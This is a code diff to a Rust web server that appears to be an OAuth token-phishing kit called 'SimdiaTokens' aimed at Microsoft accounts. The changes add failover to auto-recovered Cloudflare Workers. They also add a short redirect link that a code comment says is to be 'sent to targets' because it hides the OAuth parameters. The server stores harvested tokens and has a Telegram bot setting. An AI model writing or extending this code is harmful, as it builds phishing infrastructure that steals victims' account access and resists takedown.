@@ -10,6 +10,8 @@ use rand::Rng;
 use actix_cors::Cors;
 
 mod vault;
+mod worker_health;
+use worker_health::get_active_worker;
 use vault::Vault;
 
 mod scheduler;
@@ -91,9 +93,9 @@ use tenant_utils::{detect_tenant_fixed, get_location_from_ip};
 #[derive(Debug, Clone)]
 #[allow(dead_code)]
 pub struct AppConfig {
-    client_id: String,
-    client_secret: String,
-    redirect_uri: String,
+    pub client_id: String,
+    pub client_secret: String,
+    pub redirect_uri: String,
     first_party_ids: Vec<String>,
     database_url: String,
     telegram_bot_token: Option<String>,
@@ -161,9 +163,9 @@ struct HarvestedToken {
 
 #[derive(Clone)]
 pub struct AppState {
-    pool: SqlitePool,
-    config: AppConfig,
-    http_client: Client,
+    pub pool: SqlitePool,
+    pub config: AppConfig,
+    pub http_client: Client,
     vault: Vault,
     response_key: [u8; 32],
 }
@@ -1186,6 +1188,7 @@ async fn api_inbox(query: web::Query<InboxApiQuery>, state: web::Data<AppState>)
 struct GenerateOAuthLinkResponse {
     link: String,
     worker_url: String,
+    short_link: String,
 }
 
 #[derive(Deserialize)]
@@ -1207,8 +1210,8 @@ async fn generate_oauth_link(
         })
     } else {
         // Production: use Cloudflare Worker
-        let worker_name = env::var("CF_WORKER_NAME").unwrap_or_else(|_| "simdiatokens-oauth-worker".to_string());
-        let workers_subdomain = env::var("CF_WORKERS_SUBDOMAIN").unwrap_or_else(|_| "lubaking-co.workers.dev".to_string());
+        // Check DB for an auto-recovered worker first, fall back to env var
+        let (worker_name, workers_subdomain) = get_active_worker(&state).await;
         let worker_url = format!("https://{}.{}", worker_name, workers_subdomain);
         format!("{}/oauth/callback", worker_url)
     };
@@ -1228,9 +1231,20 @@ async fn generate_oauth_link(
         state_param
     );
 
+    // Short redirect link: the Worker's /start endpoint redirects to the
+    // full Microsoft authorize URL. This is what should be sent to targets
+    // — it's short, clean, and doesn't expose the full OAuth params.
+    let short_link = if is_local {
+        link.clone()
+    } else {
+        // Extract worker base URL from redirect_uri
+        redirect_uri.strip_suffix("/oauth/callback").unwrap_or(&redirect_uri).to_string() + "/start"
+    };
+
     HttpResponse::Ok().json(GenerateOAuthLinkResponse {
         link,
         worker_url: redirect_uri.clone(),
+        short_link,
     })
 }
 
@@ -1238,7 +1252,7 @@ async fn generate_oauth_link(
 // Robust version: never throws an uncaught exception (avoids Cloudflare Error 1101).
 // Validates MAIN_SERVER before using it so a missing/placeholder/relative
 // value produces a clear 502 instead of crashing the Worker.
-const WORKER_SCRIPT: &str = r#"// SimdiaTokens OAuth Worker
+pub const WORKER_SCRIPT: &str = r#"// SimdiaTokens OAuth Worker
 addEventListener('fetch', event => {
   event.respondWith(handleRequest(event.request).catch(err => {
     console.error('Worker uncaught error: ' + err);
